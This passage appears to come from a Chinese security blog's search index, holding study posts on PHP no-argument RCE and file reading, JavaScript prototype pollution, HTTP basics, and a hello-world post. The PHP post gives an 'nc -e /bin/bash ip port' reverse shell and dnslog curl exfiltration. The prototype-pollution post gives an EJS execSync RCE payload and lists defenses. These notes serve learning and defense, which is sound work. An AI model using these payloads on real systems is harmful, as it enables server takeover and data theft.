0-9`，`-`，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为`hex2bin`\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n那我们就可以开始构造了，首先把`PHPSESSID`的值替换成这个，然后在前面把`var_dump`换成`eval`就可以成功执行了，如图：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n成功出现`phpinfo`，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦\n\n## 4.php函数直接读取文件\n\n上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：\n\n### 1.localeconv\n\n官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将`localeconv()`的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点`.`，那按照我们上面讲的，是可以利用`current()`函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是`linux`中的`ls`，具体请看下图：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n### 2.scandir\n\n这个函数很好理解，就是列出目录中的文件和目录\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n### 3.current(pos)\n\n这里首先声明，`pos()`函数是`current()`函数的别名，他们俩是完全一样的哈\n\n这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n### 4.chdir()\n\n这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为`scandir()`会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用`chdir`切就好了，如果要向上跳就要构造`chdir('..')`\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\n### 5.array_reverse()\n\n将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个`next()`\n\n### 6.highlight_file()\n\n打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的\n\n## 无回显RCE\n\n#### 反弹shell\n\n条件：具有nc\n\n命令\n\n nc -e /bin/bash ip port\n\n然后再在服务器上开启端口接听\n\n#### dnslog\n\n发起一个dns请求需要通过linux中的`ping`命令或者`curl`命令\n\n然后这里一个dnslog的利用平台：ceye <http://ceye.io/>\n\n作为命令的分隔符，然后发起`curl`请求，然后最后用反引号执行命令\n\n#### 文件下载\n\n特定情况下压缩flag文件,并访问","tags":["web安全","基础漏洞"]},{"title":"JavaScript的原型链污染","url":"/2023/07/26/js原型链污染/","content":"\n\n\n# js原型链污染\n\n## 基础概念辨析\n\n### **原型**\n\njs中一切皆对象,js的每个对象都有一个属性原型（prototype），原型本身也是一个对象，因此该原型也有一个prototype指向上层原型，直到为null，这样就构成了原型链\n\n简单来说，原型链是javascript中类继承的一种机制，每个对象都有对应的原型，储存了定义的属性和方法，之中包含了prototype，指向上一级的原型。最上层Object原型中的prototype为null\n\n**特性**\n\n类定义中的属性，会在创建对象时在对象中创建，类定义的方法而是存在于原型之中。当使用没有定义的属性和方法时，就会顺着原型链一直寻找，直到为undefined,用此来实现继承，子类能用父类的属性和方法\n\n示例\n\n```javascript\n function Person(name) {\n        this.name = name;\n    }\n\n    Person.prototype.greet = function () {\n        console.log(`Hello, my name is ${this.name}`);\n    };\n\n    const person1 = new Person('Alice');\n    person1.greet(); // 输出 \"Hello, my name is Alice\"\n```\n\n![img](./js.jpg)\n\n​\t\t\t\t\t\t\t\t*person1对象原型对象展示*\n\n**prototype与__proto__**\n\n(1)所有引用类型（函数，数组，对象）都拥有`__proto__`属性（隐式原型）,用来查看其原型\n\n(2)所有函数拥有`prototype`属性（显式原型）（仅限函数）\n\n 简单来说，__proto__ 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。\n\n### Function 与function\n\nfunction是一个定义函数的关键字，Function是代表所有函数的内置原型对象\n\n每一个js 的function都是Function对象，Function是js内置对象，用以实现很多基本功能，如Nunmber,toString\n\nconstructor是一个对象数据属性属性,创建对象后，访问constructor属性，可以返回构造该对象的来源（不是该对象的原型链上级）\n\n### new\n\nnew constructor[([arguments])]\n\n参数\n\n`constructor`\n\n一个指定对象实例的类型的类或函数。\n\n描述\n\n`new` 关键字会进行如下的操作：\n\n1. 创建一个空的简单 JavaScript 对象（即 `{}`）；\n2. 为步骤 1 新创建的对象添加属性 `__proto__`，将该属性链接至构造函数的原型对象；\n3. 将步骤 1 新创建的对象作为 `this` 的上下文；\n4. 如果该函数没有返回对象，则返回 `this`。\n\n### 原型链污染\n\n当我们添加或者修改上层原型的一些属性，子类都又调用该恶意属性时，子类调用的属性已经被我们篡改，造成原型链污染，原型链污染可能会造成命令执行(rce)或者任意文件读取,越权等等\n\n示例\n\n```js\n  function merge(target, source) {\n        for (let key in source) {\n            if (key in source && key in target) {\n                // 如果target与source有相同的键名 则让target的键值为source的键值\n                merge(target[key], source[key])\n            } else {\n                target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值\n            }\n        }\n    }\n    let o1 = {}\n    let o2 = JSON.parse('{ \"a\": 1, \"__proto__\": { \"b\": 2} }');\n    merge(o1, o2)\n    console.log(o1.a, o1.b)\n\n    o3 = {}\n    console.log(o3.b)\n```\n\n漏洞点\n\n一般对对象进行复制拷贝,如merge函数或者copy函数，会将传入的json数据拷贝至已创建对象，此时可能会产生原型链污染\n\n#### ejs模板基于原型链污染的rce\n\n直接上POC\n\n```js\na; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //\n```\n\n参考学习：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/\n\n### 扩展\n\n对于`toUpperCase()`函数\n\n```\n字符\"ı\"、\"ſ\" 经过toUpperCase处理后结果为 \"I\"、\"S\"\n```\n\n对于`toLowerCase`\n\n```\n字符\"K\"经过toLowerCase处理后结果为\"k\"(这个K不是K)\n```\n\n详情可见p神的文章[https://www.leavesongs.com](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)\n\npython中也存在原型链污染\n\n可参考文章：https://tttang.com/archive/1876\n\nctf例题：https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5\n\n# 防御\n\n1.Object.freeze()冻结原型\n\n```js\nObject.freeze(Object.prototype);\nObject.freeze(Object)\n```\n\n冻结原型后，无法添加新的原型至原型链\n\n2.对JSON输入验证\n\nnpm上有很多库，如avj，可以对JSON数据验证，排除json中数据中不需要的属性\n\n或者在复制对象时，遍历键名时候，检查__proto__和prototype\n\n3.使用map代替{}\n\n4.使用Object.create()安全创建对象\n\n这样创建的对象没有属性\n\n5.node.js中可以通过disable-proto直接禁止操作原型链","tags":["web安全"]},{"title":"http概述","url":"/2023/07/20/http概述/","content":"\n\n\n\n\n------\n\n- #### 概述\n\n  ​\tWeb 使用一种名为 HTTP（超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流 程。而协议是指规则的约定。Web 是建立在 HTTP 协议上通 信的。 http协议主要是计算机网络系统上的应   用层。\n\n- #### TCP/IP协议族\n\n  ##### 主要内容：\n\n```\n\t应用层：FTP（文件传输协议）和DNS（域名系统）和http协议\n\n\t传输层：TCP（传输控制协议）和UDP（用户数据报协议）\n\n\t网络层：处理在网络上流动的数据包 \n\n\t链路层：处理连接网络的硬件部分 \n```\n\n- #### IP、TCP和DNS：\n\n```\n\t**IP**\n\tIP地址：指明被分配的地址\n\tMAC地址：指网卡所属固定的地址\n\t运作方式：利用IP指明目标，中转时利用下一站中转设备的MAC地址搜素下一个中转目标。利用ARP协议可以根据IP地址解析出MAC地址。\n\t**TCP**\n\tTCP提供字节流服务，把数据分割，并通过带SYN/ACK的数据包（三次）确定是否最终传送到对方。\n\t**DNS**\n\t提供域名和IP之间解析服务\n```\n\n- #### URI和URL\n\n  ​\tURI：是由某个协议方案表示的资源的定位标识符\n\n  ​\tURL:是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址 \n\n  ​\tURI格式：协议方案名+登录信息（认证）+服务器地址+服务器端口号+带层次的文件路径+查询字符串+片段标识符\t\t如：http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1\n\n  ​\t\n\n### 简单的http协议\n\n------\n\nHTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。\n\n​\t **请求报文**：主要由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。\n\n​\t**响应报文**：基本由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体构成。 \n\n##### HTTP方法\n\n```\n\t**GET: 获取资源**\n\tGET方法用来请求访问已被 URI 识别的资源\n\t\n\t**POST: 传输实体主体**\n\t\n\t**PUT： 传输文件**\n\t由于PUT方法自身不带验证机制，存在安全性问题，一般的 Web 网站不使用该方法\n\t\n\t**HEARD ：获取报文首部**\n\t不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等\n\n\t**DELETE： 删除文件**\n\t\n\t**OPTIONS： 查询支持方法**\n\t用来查询针对URI指定的资源支持的方法\n\t\n\t**TRACE: 追踪路径**\n\t让 Web 服务器端将之前的请求通信环回给客户端的方法。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/篡改的。容易引发XST攻击\n\t\n\t**CONNECT：要求用隧道协议连接代理**\n\t方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（安全套接层）和 TLS（传输层安全）协议把通信内容加密后经网络隧道传输。\t\n```\n\n​\t管线化：利用持久化连接，发送请求后不用等待回应就可直接发送下一个请求。\n\n​\t**Cookie**:通常用于判断两个请求是否来自同一浏览器，Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态 。\n\n### http报文\n\n------\n\n#### HTTP信息\n\n​\t首部内容：请求行、状态行、首部字段\n\n​\t报文：是 HTTP 通信中的基本单位，由 8 位组字节流组成，通过 HTTP 通信传输。 \n\n​\t实体：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实 体首部和实体主体组成。 \n\n​\t常见压缩传输的内容编码：gzip、compress、deflate、identity\n\n##### 多部分对象集合\n\n- multipart/form-data\n\n  ​\tweb表单文件上传时使用\n\n- multipart/byteranges\n\n  ​\t状态码206响应报文包含了多个范围的内容时使用\n\n  获取部分内容的范围请求：用到首部字段Range来指定资源的byte范围\n\n  内容协商技术：服务器驱动协商、客户端驱动协商、透明协商\n\n\n\n### http状态码\n\n------\n\n##### 状态码类别\n\n|      | 类别             | 原因短语                   |\n| ---- | ---------------- | -------------------------- |\n| 1XX  | 信息性状态码     | 接收的请求正在处理         |\n| 2XX  | 成功状态码       | 请求正常处理完毕           |\n| 3XX  | 重向状态码       | 需要进行附加操作以完成请求 |\n| 4XX  | 客户端错误状态码 | 服务器无法处理请求         |\n| 5XX  | 服务器错误状态码 | 服务器处理出错             |\n\n##### 14种常见的状态码\n\n```\n\t**200 OK**\n\t请求被正常处理\n\t\n\t**204 No Content**\n\t请求已成功处理，但响应报文中不含实体的主体部分，也不允许返回任何实体的主体\n\t\n\t**206 Partial Content**\n\t客户端进行了范围请求，服务器成功执行请求，响应报文中包含由Content-Range指定范围的实体范围\n\t\n\t**301 Moved Permanently**\n\t永久性定向。--请求的资源已经被分配到了新的URI\n\t\n\t**302 Found**\n\t临时性重定向。\n\t\n\t**303 See Other**\n\t表示请求对应的资源存在另一个URI，应使用GET方法定向获取请求资源\n\t\n\t**304 Not Modified**\n\t无需再次传输请求的内容，可以使用缓存的内容。\n\t\n\t**307 Temporary Redirect**\n\t临时重定向,保持原有信息\n\t\n\t**400 Bad Request**\n\t报文中存在语法错误，需要修改请求重新发送\n\t\n\t**401 Unauthorized**\n\t表示发送请求需要有通过HTTP认证的认证信息，若之前进行过1次请求，则表示用户认证失败\n\t\n\t**403 Forbidden\n\t请求资源的访问被服务器拒绝\n\t\n\t**404 Not Found**\n\t服务器上无法找到请求的资源\n\t\n\t**500 Internal Server Error**\n\t服务器在执行请求时发生了错误，也有可能是Web应用存在的bug或临时的故障\n\t\n\t**503 Service Unavailable**\n\t服务器暂时处于超负载或正在进行停机维护，现在无法处理请求\n\t\n```\n\n\n\n### web服务器\n\n------\n\n#### 通信数据转发程序\n\n```\n\t**代理**\n\t作为客户端和服务器的‘中间人’\n\t缓存代理：会预先把资源的副本（缓存）保存在代理服务器上\n\t透明代理：转发请求或响应时，不对报文做任何加工代理\n\t\n\t**网关**\n\t转发来自其他服务器通信数据的服务器，对客户端的请求进行处理\n\t网关可以使通信线路上的服务器提供非HTTP协议服务，提高安全性。\n\t\n\t**隧道**\n\t是在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序\n\t目的是为了进行安全的通信\n```\n\n##### http出现之前的协议\n\n​\tFTP:传输文件时使用的协议\n\n​\tNNTP：用于 NetNews 电子会议室内传送消息的协议 \n\n​\tArchie ：搜索 anonymous FTP 公开的文件信息的协议 \n\n​\tWAIS ：以关键词检索多个数据库使用的协议 \n\n​\tGopher ：查找与互联网连接的计算机内信息的协议 \n\n\n\n### HTTP首部\n\n​\t首部字段结构：手段字段名：字段值\n\n##### 通用首部\n\n```\n**Cache-Control 控制缓存的行为**\n指令:\t\tpublic 表明其他用户也可利用缓存\n\t\t private 响应只能以特殊用户作为对象\n\t\t no-cache 用户端不接受缓存过的响应，缓存服务器不能进行缓存\n\t\t no-store 表明请求和响应中包含机密信息，不能进行缓存\n\t\t s-maxage=...（秒）    指定缓存期限和认证的指令\n\t\t min-fresh=...（秒）\t指示客户端允许存储的响应至少 N 秒是新鲜的\n\t\t max-stale=...（秒）可指示缓存资源，处于指定范围内，过期也可以接受。\n\t\t only-if-cached\t客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回\n\t\t must—revalidate代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。\n\t\t proxy-revalidate缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性\n\t\t no-transform 缓存都不能改变实体主体的媒体类型\n\t\t \n**Connection 逐跳首部、连接的管理**\n指令\t\tclose 服务器想断开连接\n\t\t Keep-Alive 旧版本http协议实现持久化连接\n\n**Date 创建报文的日期时间**\n格式：\t如Tue, 03 Jul 2012 04:40:59 GM或者Tue Jul 03 04:40:59 2012\n\n**Pragma 报文指令**\n指令：\t\tno-cache 只在客户端请求中，所有中间服务器不返回缓存资源\n\n**Trailer 报文末端的首部一览**\n允许发送方在分块发送的消息后面添加额外的元信息\n\n**Transfer-Encoding 指定报文主体的传输编码方式**\n\n**Upgrade 升级为其他协议**\n\n**Via 代理服务器的相关信息**\n追踪报文传输路径\n\n**Warning 错误通知**\n格式：\t[警告码][警告的主机:端口号]“[警告内容]”([日期时间])\n```\n\n##### 请求首部字段\n\n```\n首部字段名 \t\t说明\n**Accept 用户代理可处理的媒体类型**\nq=（0-1）用来权衡优先级，默认为1，前用；间隔\n\n**Accept-Charset 优先的字符集**\n\n**Accept-Encoding 优先的内容编码**\n内容编码优先级\n\n**Accept-Language 优先的语言（自然语言）**\n\n**Authorization Web认证信息**\n\n**Expect 期待服务器的特定行为**\n错误返回状态码417 Expectation Failed\n\n**From 用户的电子邮箱地址**\n\n**Host 请求资源所在服务器**\n\n**If-Match 比较实体标记（ETag）**\nIf-xxx 为条件请求，条件为真时执行\n\n*If-Modified-Since 比较资源的更新时间*\n如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应\n\n**If-None-Match 比较实体标记（与 If-Match 相反）**\n\n**If-Range 资源未更新时发送实体 Byte 的范围请求**\n\nIf-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）\n如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。\n\n**Max-Forwards 最大传输逐跳数**\n当值为0时，经过的服务器不在进行转发，直接返回响应\n\n**Proxy-Authorization 代理服务器要求客户端的认证信息**\n\n**Range 实体的字节范围请求**\n\n**Referer 对请求中URI的原始获取方**\n\n**TE 传输编码的优先级**\n\n**User-Agent 客户端程序的信息**\n将创建的请求的浏览器和用户代理名称等信息传达给服务器\n```\n\n##### 响应首部字段\n\n```\n首部字段名\t    \t说明\n**Accept-Ranges 是否接受字节范围请求**\n\n**Age 推算资源创建经过时间**\n\n**ETag \t资源的匹配信息**\n用户端实体标识\n\n**Location \t令客户端重定向至指定URI**\n\n**Proxy-Authenticate 代理服务器对客户端的认证信息**\n服务器是安装http服务器的应用程序是信息\n\n**Retry-After 对再次发起请求的时机要求**\n\n**Server     HTTP服务器的安装信息**\n服务器是安装http服务器的应用程序是信息\n\n**Vary \t代理服务器缓存的管理信息**\n\n**WWW-Authenticate \t服务器对客户端的认证信息**\nhttp访问认证\n```\n\n##### 实体首部字段\n\n```\n首部字段名 \t\t说明\n**Allow 资源可支持的HTTP方法**\n\n**Content-Encoding 实体主体适用的编码方式**\n\n**Content-Language 实体主体的自然语言**\n\n**Content-Length 实体主体的大小（单位：字节）**\n\n**Content-Location 替代对应资源的URI**\n\n**Content-MD5 实体主体的报文摘要**\n判断报文的准确性\n\n**Content-Range 实体主体的位置范围**\n\n**Content-Type \t实体主体的媒体类型**\n\n**Expires 实体主体过期的日期时间**\n\n**Last-Modified 资源的最后修改日期时间**\n```\n\n##### 为 Cookie 服务的首部字段\n\n```\n**Set-Cookie**\nexpires:浏览器可发送cookie的有效期\npath：限定cookie发送范围的文件目录\ndomain：指定域名与结尾匹配可发送cookie\nsecure：web仅在HTTPS时，才发送cookie\nHttpOnly：使JavaScript无法获取cookie，防止xss攻击对信息的窃取\n```\n\n##### 其他首部字段\n\n```\n**X-Frame-Options 用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题 **响应首部\nDENY：拒绝\nSAMEORIGIN：仅同域名下页面匹配时许可\n\n**X-XSS-Protection 于控制浏览器 XSS 防护机制的开关**响应首部\n0：无效\t1： 有效\n\n**DNT 拒绝个人信息被收集**请求首部\n0：同意被跟踪\t\t1：拒绝被跟踪\n\n*P3P 在线隐私偏好平台**\n```\n\n","tags":["web基础"]},{"title":"Hello World","url":"/2023/07/19/hello-world/","content":"## 第一篇博客\n\n\n\n​\t不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。","tags":["web"]}]